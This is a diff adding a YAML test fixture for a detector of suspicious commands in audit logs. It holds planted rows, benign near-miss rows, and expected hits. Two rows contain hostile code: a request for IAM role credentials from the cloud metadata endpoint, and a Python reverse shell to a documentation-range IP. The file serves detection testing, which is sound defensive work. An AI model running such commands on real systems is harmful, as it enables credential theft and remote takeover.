@@ -1,0 +1,56 @@
+# Planted: an API command stealing instance-role credentials from IMDS; a reverse shell in a notebook.
+# Near misses: subprocess for pip install; a normal secret read.
+rows:
+- t: -20
+  service_name: data-plane-router
+  action_name: commandExecute
+  email: 88888888-9999-0000-1111-222222222222
+  ip: 203.0.113.140
+  request_params:
+    command: 'import requests
+
+      r = requests.get(''http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role'')
+
+      print(r.text)'
+    cluster_id: c1
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: eve@corp.example
+  ip: 10.0.0.9
+  request_params:
+    commandText: 'import socket,subprocess,os
+
+      s=socket.socket()
+
+      s.connect((''203.0.113.141'',4444))
+
+      os.dup2(s.fileno(),0)
+
+      pty.spawn(''/bin/sh'')'
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: dev@corp.example
+  ip: 10.0.0.10
+  request_params:
+    commandText: 'import subprocess
+
+      subprocess.run([''pip'',''install'',''pandas''], check=True)'
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: dev@corp.example
+  ip: 10.0.0.10
+  request_params:
+    commandText: 'token = dbutils.secrets.get(''app'', ''api_token'')
+
+      resp = call_api(token)'
+expect:
+  hits:
+  - technique: imds_credential
+    actor_kind: sp
+  - technique: reverse_shell
+    actor: eve@corp.example
+  misses:
+  - actor: dev@corp.example
